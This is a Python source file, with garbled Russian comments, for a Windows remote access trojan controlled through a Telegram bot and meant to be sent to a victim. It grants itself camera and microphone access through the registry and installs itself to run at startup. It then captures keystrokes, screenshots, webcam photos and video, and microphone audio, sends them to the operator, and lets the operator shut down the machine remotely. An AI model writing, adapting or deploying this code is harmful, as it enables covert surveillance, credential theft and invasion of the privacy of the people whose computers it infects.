import os
import sys
import time
import threading
import winreg as reg
import pyautogui
import psutil
import cv2
import numpy as np
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
from pynput import keyboard as kb
import wave
import pyaudio
import lameenc
import traceback
import io
import zipfile
import platform
import tkinter as tk
from tkinter import messagebox

# === –ö–æ–Ω—Ñ–∏–≥ ===
TOKEN = ""  # –ë—É–¥–µ—Ç –∑–∞–ø–æ–ª–Ω–µ–Ω –ø–æ—Å–ª–µ –≤–≤–æ–¥–∞
PASSWORD = "1717"

# === –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ ===
keylogger_active = False
keylogger_data = ""
keylogger_lock = threading.Lock()
webcam_recording = False
lock_event = threading.Event()


# === –°–æ—Ö—Ä–∞–Ω–∏—Ç—å —Ç–æ–∫–µ–Ω –≤ —ç—Ç–æ—Ç –∂–µ —Ñ–∞–π–ª ===
def save_token_to_self(token):
    file_path = __file__
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        token_found = False
        for i, line in enumerate(lines):
            if line.strip().startswith("TOKEN = "):
                lines[i] = f'TOKEN = "{token}"\n'
                token_found = True
                break

        if not token_found:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–°—Ç—Ä–æ–∫–∞ TOKEN = ... –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(lines)

        messagebox.showinfo("‚úÖ –£—Å–ø–µ—Ö", "–¢–æ–∫–µ–Ω —Å–æ—Ö—Ä–∞–Ω—ë–Ω! –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É.")
        return True
    except Exception as e:
        messagebox.showerror("‚ùå –û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å:\n{str(e)}")
        return False


# === GUI: –æ–∫–Ω–æ —Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é –≤—Å—Ç–∞–≤–∏—Ç—å —Ç–æ–∫–µ–Ω (Ctrl+V) ===
def show_token_input():
    root = tk.Tk()
    root.title("üîê –í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞")
    root.geometry("420x220")
    root.resizable(False, False)
    root.attributes("-topmost", True)

    tk.Label(
        root,
        text="–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω Telegram-–±–æ—Ç–∞:",
        font=("Arial", 10)
    ).pack(pady=10)

    entry = tk.Entry(root, width=50, font=("Arial", 9))
    entry.pack(pady=5)

    tk.Label(
        root,
        text="–û—Ç–ø—Ä–∞–≤—å—Ç–µ —ç—Ç–æ—Ç —Ñ–∞–π–ª –∫–ª–∏–µ–Ω—Ç—É.\n"
             "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ ‚Äî —á–µ—Ä–µ–∑ Telegram.",
        font=("Arial", 9), fg="gray"
    ).pack(pady=10)

    # –í—Å—Ç–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Ctrl+V
    def on_paste(event):
        try:
            # –í—Å—Ç–∞–≤–ª—è–µ–º –∏–∑ –±—É—Ñ–µ—Ä–∞
            root.clipboard_update()
            text = root.clipboard_get()
            entry.insert("insert", text)
            return "break"  # –±–ª–æ–∫–∏—Ä—É–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ
        except tk.TclError:
            messagebox.showwarning("‚ö†Ô∏è –ë—É—Ñ–µ—Ä –ø—É—Å—Ç", "–ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ –ø—É—Å—Ç –∏–ª–∏ —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–µ —Ç–µ–∫—Å—Ç.")
            return "break"

    # –†–∞–∑—Ä–µ—à–∞–µ–º –≤—Å—Ç–∞–≤–∫—É
    entry.bind("<Control-v>", on_paste)
    entry.bind("<Button-3>", on_paste)  # –ü–ö–ú
    entry.focus()

    def on_submit():
        token = entry.get().strip()
        if not token:
            messagebox.showwarning("–ü—É—Å—Ç–æ", "–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω!")
            return
        if ":" not in token or not token.split(":")[0].isdigit():
            messagebox.showwarning("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç", "–≠—Ç–æ –Ω–µ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞.")
            return
        if save_token_to_self(token):
            root.destroy()
            sys.exit(0)

    tk.Button(
        root,
        text="–°–æ—Ö—Ä–∞–Ω–∏—Ç—å –∏ –≤—ã–π—Ç–∏",
        command=on_submit,
        bg="#4CAF50", fg="white",
        font=("Arial", 10), padx=10, pady=5
    ).pack(pady=10)

    root.mainloop()


# === –ü—Ä–æ–≤–µ—Ä–∫–∞: –µ—Å–ª–∏ —Ç–æ–∫–µ–Ω –ø—É—Å—Ç ‚Äî –ø–æ–∫–∞–∑–∞—Ç—å –æ–∫–Ω–æ ===
if __name__ == "__main__":
    if TOKEN == "":
        show_token_input()


# === –†–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω—É ===
def grant_privacy_access():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",
                          0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "Value", 0, reg.REG_SZ, "Allow")
        reg.CloseKey(key)
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone",
                          0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "Value", 0, reg.REG_SZ, "Allow")
        reg.CloseKey(key)
    except Exception as e:
        print("–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞:", e)


# === –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ ===
def add_to_startup():
    try:
        current_path = sys.argv[0]
        if getattr(sys, 'frozen', False):
            target_path = sys.executable
        else:
            target_path = os.path.join(os.path.dirname(current_path), "client.exe")
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\Run",
                          0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "ClientBot", 0, reg.REG_SZ, f'"{target_path}"')
        reg.CloseKey(key)
        username = os.getenv("USERNAME")
        startup_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        startup_exe = os.path.join(startup_dir, "client.exe")
        if not os.path.exists(startup_exe):
            import shutil
            shutil.copy(target_path, startup_exe)
            print(f"[+] –í –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–µ: {startup_exe}")
    except Exception as e:
        print("–û—à–∏–±–∫–∞ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏:", e)


# === –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π ===
def send_message(update, context, text=None, reply_markup=None, parse_mode=None):
    try:
        if update.message:
            return update.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        elif update.callback_query:
            return update.callback_query.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        print("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", e)


def send_photo(update, context, buffer, caption=""):
    try:
        if update.message:
            update.message.reply_photo(photo=InputFile(buffer), caption=caption)
        elif update.callback_query:
            update.callback_query.message.reply_photo(photo=InputFile(buffer), caption=caption)
    except Exception as e:
        send_message(update, context, f"‚ùå –û—à–∏–±–∫–∞ —Ñ–æ—Ç–æ: {str(e)}")


# === –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–æ–º–∞–Ω–¥ ===
def safe_run(func):
    def wrapper(update, context):
        try:
            return func(update, context)
        except Exception as e:
            print("–û—à–∏–±–∫–∞:", e)
            traceback.print_exc()
            send_message(update, context, "‚ùå –û—à–∏–±–∫–∞.")
    return wrapper


@safe_run
def start(update, context):
    send_message(update, context, "–í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É:", reply_markup=start_keyboard())


@safe_run
def screenshot(update, context):
    img = pyautogui.screenshot()
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    buf.seek(0)
    send_photo(update, context, buf, "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç")


@safe_run
def webcam(update, context):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        send_message(update, context, "‚ùå –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ.")
        return
    ret, frame = cap.read()
    cap.release()
    if not ret:
        send_message(update, context, "‚ùå –û—à–∏–±–∫–∞ —Ñ–æ—Ç–æ.")
        return
    success, data = cv2.imencode(".jpg", frame)
    if not success:
        send_message(update, context, "‚ùå –û—à–∏–±–∫–∞ –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è.")
        return
    buf = io.BytesIO(data)
    buf.seek(0)
    send_photo(update, context, buf, "üì∑ –§–æ—Ç–æ —Å –≤–µ–±–∫–∏")


@safe_run
def stats(update, context):
    uptime = time.time() - start_time
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    battery = psutil.sensors_battery()
    bat_str = f"{battery.percent}%" if battery else "–ù–µ—Ç"
    text = (
        f"üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n"
        f"Uptime: {time.strftime('%H:%M:%S', time.gmtime(uptime))}\n"
        f"CPU: {cpu}%\n"
        f"–ü–∞–º—è—Ç—å: {mem}%\n"
        f"–î–∏—Å–∫: {disk}%\n"
        f"–û–°: {platform.version()}\n"
        f"–ë–∞—Ç–∞—Ä–µ—è: {bat_str}"
    )
    send_message(update, context, text)


# === –ö–µ–π–ª–æ–≥–≥–µ—Ä ===
@safe_run
def start_keylogger(update, context):
    global keylogger_active, keylogger_data
    if keylogger_active:
        send_message(update, context, "‚ö†Ô∏è –£–∂–µ –∑–∞–ø—É—â–µ–Ω.")
        return
    keylogger_data = ""
    keylogger_active = True
    send_message(update, context, "üü¢ –ö–µ–π–ª–æ–≥–≥–µ—Ä –∑–∞–ø—É—â–µ–Ω (60 —Å–µ–∫)...")
    def listener():
        with kb.Listener(on_press=on_press) as l:
            l.join()
    threading.Thread(target=listener, daemon=True).start()

    def stopper():
        time.sleep(60)
        global keylogger_active
        keylogger_active = False
        if keylogger_data.strip():
            send_message(update, context, f"üìù –õ–æ–≥:\n```\n{keylogger_data}\n```", parse_mode='Markdown')
        else:
            send_message(update, context, "üìù –ù–∏—á–µ–≥–æ –Ω–µ –Ω–∞–±—Ä–∞–Ω–æ.")
    threading.Thread(target=stopper, daemon=True).start()


def on_press(key):
    global keylogger_active, keylogger_data
    if not keylogger_active:
        return False
    try:
        with keylogger_lock:
            keylogger_data += key.char
    except AttributeError:
        if key == kb.Key.space:
            with keylogger_lock:
                keylogger_data += " "
        elif key == kb.Key.enter:
            with keylogger_lock:
                keylogger_data += "\n"
        elif key == kb.Key.backspace:
            with keylogger_lock:
                keylogger_data = keylogger_data[:-1]
        else:
            with keylogger_lock:
                keylogger_data += f" [{key}] "


# === –ê—É–¥–∏–æ ===
def record_microphone(output_wav="output.wav", duration=5, rate=44100, chunk=1024):
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=rate, input=True, frames_per_buffer=chunk)
        frames = [stream.read(chunk) for _ in range(0, int(rate / chunk * duration))]
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(output_wav, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
        wf.close()
    except Exception as e:
        print("–û—à–∏–±–∫–∞ –∞—É–¥–∏–æ:", e)


def wav_to_mp3(wav_path, mp3_path, bitrate=64):
    try:
        with open(wav_path, 'rb') as f:
            wav_data = f.read()
        audio_data = bytearray(wav_data[0x2C:])
        encoder = lameenc.Encoder()
        encoder.set_bit_rate(bitrate)
        encoder.set_in_sample_rate(44100)
        encoder.set_channels(1)
        encoder.set_quality(2)
        mp3_data = encoder.encode(bytes(audio_data)) + encoder.flush()
        with open(mp3_path, 'wb') as f:
            f.write(mp3_data)
        os.remove(wav_path)
    except Exception as e:
        print("–û—à–∏–±–∫–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏:", e)


@safe_run
def record_audio_command(update, context):
    args = context.args
    if not args or not args[0].isdigit():
        send_message(update, context, "‚ùå /recordaudio <—Å–µ–∫> (–¥–æ 60)")
        return
    duration = min(int(args[0]), 60)
    send_message(update, context, f"üéôÔ∏è –ó–∞–ø–∏—Å—å {duration} —Å–µ–∫...")
    record_microphone("output.wav", duration)
    if not os.path.exists("output.wav"):
        send_message(update, context, "‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏.")
        return
    wav_to_mp3("output.wav", "output.mp3")
    if not os.path.exists("output.mp3"):
        send_message(update, context, "‚ùå –û—à–∏–±–∫–∞ MP3.")
        return
    size = os.path.getsize("output.mp3") / 1024 / 1024
    with open("output.mp3", 'rb') as f:
        send_document(update, context, f, f"üéôÔ∏è –ê—É–¥–∏–æ (~{int(size)} MB)")
    os.remove("output.mp3")


# === –í–∏–¥–µ–æ ===
def record_webcam_video(duration=10, filename="webcam.avi", res=(640, 480), fps=15):
    global webcam_recording
    if webcam_recording: return None
    webcam_recording = True
    cap = cv2.VideoCapture(0)
    if not cap.isOpened(): return None
    out = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'XVID'), fps, res)
    start = time.time()
    while time.time() - start < duration:
        ret, frame = cap.read()
        if ret: out.write(frame)
        else: break
    cap.release()
    out.release()
    webcam_recording = False
    return filename


@safe_run
def send_webcam_video(update, context):
    args = context.args
    if not args or not args[0].isdigit():
        send_message(update, context, "‚ùå /recordvideo <—Å–µ–∫> (–¥–æ 30)")
        return
    duration = min(int(args[0]), 30)
    send_message(update, context, f"üé• –ó–∞–ø–∏—Å—å {duration} —Å–µ–∫...")
    file = record_webcam_video(duration)
    if not file or not os.path.exists(file):
        send_message(update, context, "‚ùå –û—à–∏–±–∫–∞ –≤–∏–¥–µ–æ.")
        return
    size = os.path.getsize(file) / 1024 / 1024
    if size > 50:
        zip_file = compress_to_zip(file, "webcam.zip")
        os.remove(file)
        with open(zip_file, 'rb') as f:
            send_document(update, context, f, "üìÅ –í–∏–¥–µ–æ (–∞—Ä—Ö–∏–≤)")
        os.remove(zip_file)
    else:
        with open(file, 'rb') as f:
            send_document(update, context, f, f"üé• –í–∏–¥–µ–æ (~{int(size)} MB)")
        os.remove(file)


# === –£—Ç–∏–ª–∏—Ç—ã ===
def compress_to_zip(file, zip_name="output.zip"):
    with zipfile.ZipFile(zip_name, 'w') as z:
        z.write(file, os.path.basename(file))
    return zip_name


def send_document(update, context, file, caption=""):
    if update.message:
        update.message.reply_document(document=file, caption=caption)
    elif update.callback_query:
        update.callback_query.message.reply_document(document=file, caption=caption)


# === –ö–Ω–æ–ø–∫–∏ ===
def start_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç", callback_data='screenshot')],
        [InlineKeyboardButton("üì∑ –í–µ–±-–∫–∞–º–µ—Ä–∞", callback_data='webcam')],
        [InlineKeyboardButton("üéôÔ∏è –ê—É–¥–∏–æ", callback_data='recordaudio')],
        [InlineKeyboardButton("üé• –í–∏–¥–µ–æ —Å –≤–µ–±–∫–∏", callback_data='recordvideo')],
        [InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data='stats')],
        [InlineKeyboardButton("‚å®Ô∏è –ö–µ–π–ª–æ–≥–≥–µ—Ä", callback_data='keylogger')],
        [InlineKeyboardButton("üîí –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", callback_data='lock')],
        [InlineKeyboardButton("üîì –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", callback_data='unlock')],
        [InlineKeyboardButton("‚èª –í—ã–∫–ª", callback_data='shutdown')],
        [InlineKeyboardButton("üîÅ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞", callback_data='restart')],
    ])


# === –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–æ–∫ ===
def button_handler(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    if lock_event.is_set() and not data.startswith('unlock'):
        query.edit_message_text("‚ùå –ö–ª–∏–µ–Ω—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.")
        return
    if data == 'screenshot':
        threading.Thread(target=screenshot, args=(update, context), daemon=True).start()
    elif data == 'webcam':
        threading.Thread(target=webcam, args=(update, context), daemon=True).start()
    elif data == 'stats':
        threading.Thread(target=stats, args=(update, context), daemon=True).start()
    elif data == 'keylogger':
        threading.Thread(target=start_keylogger, args=(update, context), daemon=True).start()
    elif data == 'recordaudio':
        send_message(update, context, "–í–≤–µ–¥–∏—Ç–µ: /recordaudio <—Å–µ–∫>")
    elif data == 'recordvideo':
        send_message(update, context, "–í–≤–µ–¥–∏—Ç–µ: /recordvideo <—Å–µ–∫>")
    elif data == 'lock':
        lock_screen()
        query.edit_message_text("üîí –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.")
    elif data == 'unlock':
        query.edit_message_text("–í–≤–µ–¥–∏—Ç–µ /unlock <–ø–∞—Ä–æ–ª—å>")
    elif data == 'shutdown':
        query.edit_message_text("‚èª –í—ã–∫–ª—é—á–∞—é...")
        os.system("shutdown /s /t 1")
    elif data == 'restart':
        query.edit_message_text("üîÅ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞—é—Å—å...")
        os.system("shutdown /r /t 1")


# === –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ ===
def lock_screen():
    lock_event.set()

def unlock_screen():
    lock_event.clear()


# === –ë–æ—Ç ===
def bot_loop():
    while True:
        try:
            updater = Updater(TOKEN, use_context=True)
            dp = updater.dispatcher
            dp.add_handler(CommandHandler("start", start))
            dp.add_handler(CommandHandler("screenshot", screenshot))
            dp.add_handler(CommandHandler("webcam", webcam))
            dp.add_handler(CommandHandler("stats", stats))
            dp.add_handler(CommandHandler("startlog", start_keylogger))
            dp.add_handler(CommandHandler("recordaudio", record_audio_command))
            dp.add_handler(CommandHandler("recordvideo", send_webcam_video))
            dp.add_handler(CallbackQueryHandler(button_handler))
            updater.start_polling()
            updater.idle()
        except Exception as e:
            print("–û—à–∏–±–∫–∞! –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫...")
            time.sleep(3)


# === –ó–∞—â–∏—Ç–∞ –æ—Ç –¥—É–±–ª–µ–π ===
def single_instance():
    try:
        from ctypes import windll
        mutex = windll.kernel32.CreateMutexW(None, False, "MyUniqueAppMutex")
        if windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except Exception:
        pass


# === –ó–∞–ø—É—Å–∫ ===
if __name__ == "__main__":
    start_time = time.time()
    single_instance()
    grant_privacy_access()
    add_to_startup()
    bot_loop()